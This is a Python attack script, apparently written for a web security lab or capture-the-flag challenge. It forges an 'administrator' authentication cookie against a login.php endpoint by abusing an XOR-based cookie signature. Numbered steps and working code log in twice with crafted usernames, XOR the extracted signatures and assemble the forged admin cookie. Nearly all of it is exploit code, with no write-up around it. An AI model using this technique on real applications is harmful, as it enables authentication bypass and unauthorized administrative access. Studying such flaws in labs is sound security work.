'''
1.login as "administ"
2.decode the cookie and extract the signature
3.xor the signature with "rator"
4.llogin with this value as username
5.decode the new cookie, extract the signature
6.concatenate the signature with "administrator" to get the cookie
7. send the cookie to the applicaiton
'''
import time
import requests
import base64
import chardet
import sys
from urllib.parse import quote, unquote

#URL
url = "http://xxxxx"
#debug proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
#Headers
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "charset":"UTF-8"
}

def xor(str1, str2):
    if len(str1) != len(str2):
        raise ValueError("Byte arrays must have equal length")
    # XOR operation on each pair of bytes
    result_bytes = bytes(a ^ b for a, b in zip(str1, str2))
    print("XOR: " + str(result_bytes))
    return result_bytes

def login(login):
    #create the session
    session = requests.Session()
    #form
    payload = 'username='+quote(login)+'&password=Password1'
    #print("payload: " +payload)
    response = session.post(url + "login.php", data=payload, proxies=proxies, headers=headers)
    if response.status_code == 200:
        print("200 OK")
        auth_cookie_value = session.cookies.get('auth')
        if auth_cookie_value:
            print("auth cookie:", auth_cookie_value)
        else:
            print("The 'auth' cookie was not found.")
            print(response.content)
            sys.exit()
    session.close
    return unquote(auth_cookie_value)

def main():
    signature1 = base64.b64decode(login("administ")).split(b'--')[1]
    signature2 = b"rator\00\00\00"
    login2 = xor(signature1,signature2)
    signature3 = base64.b64decode(login(login2)).split(b'--')[1]
    #xor(b"administ", b"\00\00\00\00\00\00\00\00")
    adminCookie = base64.b64encode(b"administrator--" + signature3)
    print("adminCookie: ", adminCookie)



if __name__ == "__main__":
    main()
